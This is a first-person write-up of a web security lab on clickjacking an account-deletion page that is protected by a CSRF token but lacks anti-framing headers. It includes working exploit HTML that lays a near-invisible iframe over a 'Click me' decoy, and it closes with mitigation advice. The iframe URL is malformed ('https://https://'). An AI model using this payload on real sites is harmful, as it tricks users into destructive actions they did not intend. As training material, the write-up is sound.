# Lab: Basic Clickjacking with CSRF Token Protection

## Description

This lab demonstrates a clickjacking vulnerability in which the account deletion functionality is protected by a CSRF token, but the application lacks anti-framing protections. The objective is to trick a victim into clicking the hidden **Delete Account** button.

## Exploitation

First, I logged into the application using the provided credentials and navigated to the exploit server. I then created a malicious page containing a visible decoy element and an iframe loading the account page. The iframe dimensions were set to approximately **700px × 500px**, and its opacity was initially reduced to facilitate alignment.

By adjusting the position of the decoy element, I aligned it with the **Delete Account** button inside the iframe. Once the alignment was verified, I reduced the iframe opacity to make it almost invisible and changed the decoy text to **"Click me"**. After storing and delivering the exploit, the victim's click was redirected to the hidden button, causing the account deletion request to be submitted successfully.

### Exploit HTML

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe src="https://https://0a94004f046a55fc8087038e009d0066.web-security-academy.net/my-account"></iframe>
```



This lab shows that CSRF tokens do not prevent clickjacking attacks because the request originates from the legitimate webpage and contains a valid session and CSRF token. To mitigate such attacks, applications should implement anti-framing mechanisms such as **X-Frame-Options** and **Content Security Policy (CSP)**.
